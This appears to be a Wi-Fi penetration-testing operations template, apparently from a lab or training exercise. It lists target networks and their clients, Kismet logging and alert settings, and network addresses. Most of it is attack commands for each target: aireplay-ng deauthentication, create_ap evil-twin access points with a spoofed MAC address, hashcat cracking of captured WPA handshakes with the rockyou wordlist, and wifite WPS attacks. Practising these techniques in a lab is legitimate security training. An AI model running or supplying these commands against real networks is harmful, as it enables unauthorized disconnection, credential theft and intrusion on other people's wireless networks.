#Target Templates
#Situation:
#Position:
west_1a_laptop
east_2b_laptop
east_2b_pi

sudo systemctl enable kismet
#Operation:
Collection and targeting
#Time:
Jan 15 2024, 13:41
# Key Information
1. Survey the area with MIA

#SSID(human network name)##############
Target 1 - <MAC> Marathon
Target 2 - <MAC> TYRE
Target 3 - <MAC> Artemisium
Target 4 - 
Target 5 -
#BSSID(Make address)##############
Target 1 -
Target 2 -
Target 3 -
Target 4 - 
Target 5 -
#CHANNEL##############
Target 1 -
Target 2 -
Target 3 -
Target 4 - 
Target 5 -
#MAKE/MODEL##############
Target 1 -
Target 2 -
Target 3 -
Target 4 - 
Target 5 -
#ENCRYPTION##############
Target 1 - 
Target 2 -
Target 3 -
Target 4 - 
Target 5 -
#ASSOCIATED CLIENTS##############
Target 1 -
Target 2 - 
Target 3 -
Target 4 - 7c:2e:dd:17:ff:99 - Motorola phone
Target 5 - 7c:2e:dd:17:ff:99 - Samsung Phone
ENUMERATION
#1miranda!

--login
nmap -sN -p0 -1024

 sudo scp pi@192.168.8.211:~/collection/PE/east_2b_pi/  ~/collections/PE/west_2b_laptop/




#DEAUTH##############
#########################   TYRE   #########################     
sudo aireplay-ng -0 1 -a AP MAC -c CLIENT MAC wlx00c0cab46234 
sudo aireplay-ng -0 1 -a AP MAC -c CLIENT MAC wlx00c0cab46234 
#### Evil Twin
sudo create_ap -w wpa2 -c 2 --mac 00:c0:ca:b4:62:34 --freq-band 2.4 wlx00c0cab46234 wlo1 TYRE --no-virt
#### CRACKING PW
hcxpcapngtool -o tyre.hash.22000 Lab1.handshake # this will generate a hash of the file
hashcat -a 0 -m 22000 tyre.hash.22000 rockyou.txt
#########################   ARTEMISIUM   #########################     
sudo aireplay-ng -0 1 -a 74:DA:88:59:96:A9 -c 7C:2E:DD:17:FF:99 wlx00c0cab46234 
sudo aireplay-ng -0 1 -a AP MAC -c CLIENT MAC wlx00c0cab46234 
#### Evil Twin
sudo create_ap -w wpa2 -c 2 --mac 00:c0:ca:b4:62:34 --freq-band 2.4 wlx00c0cab46234 wlo1 TYRE --no-virt
#### CRACKING PW
hcxpcapngtool -o artemisium.hash.22000 Lab1.handshake # this will generate a hash of the file
hashcat -a 0 -m 22000 artemisium.hash.22000 rockyou.txt
#########################   MARATHON   ######################### 
sudo aireplay-ng -0 1 -a AP MAC -c CLIENT MAC wlx00c0cab46234 
sudo aireplay-ng -0 1 -a AP MAC -c CLIENT MAC wlx00c0cab46234 
#### Evil Twin
sudo create_ap -w wpa2 -c 2 --mac 00:c0:ca:b4:62:34 --freq-band 2.4 wlx00c0cab46234 wlo1 TYRE --no-virt
#### CRACKING PW
hcxpcapngtool -o marathon.hash.22000 Lab1.handshake # this will generate a hash of the file
hashcat -a 0 -m 22000 marathon.hash.22000 rockyou.txt
#PIXIE/REAVER/WPS CRACK##############
sudo wifite --wps-only 
---
#EVIL TWIN##############
sudo create_ap -w wpa2 -c 2 --mac 00:c0:ca:b4:62:34 --freq-band 2.4 wlx00c0cab46234 wlo1 TOPHAT14 --no-virt
---
##################################site 
# from the kismet_logging.conf
log_title=laptop
log_prefix=./
log_types=kismet,pcapppi,pcapng
# from the kismet_alert.conf
devicefound=00:11:22:33:44:55
devicefound_timeout=15
devicelost=00:11:22:33:44:55
devicelost_timeout=15
#NIC Devices
source=wlan0:name=panda_card
# source=wlx00c0cab46234:name=alfa_mt_gold
# source=wlxaca2132bddcd:name=Yagi_turbTenna
# source=wlx00c0cab40201:name=alfa_atheros_black
# from the kismet.conf
gps=gpsd:host=localhost,port2947,reconnect=true
#gps=virtual:lat=39.1234567,lon=-76.1234567,alt=1234

VPS Server: 10.0.0.1
outside_laptop: 10.0.0.3
outside_pi 10.0.0.5
inside_pi 10.0.0.7
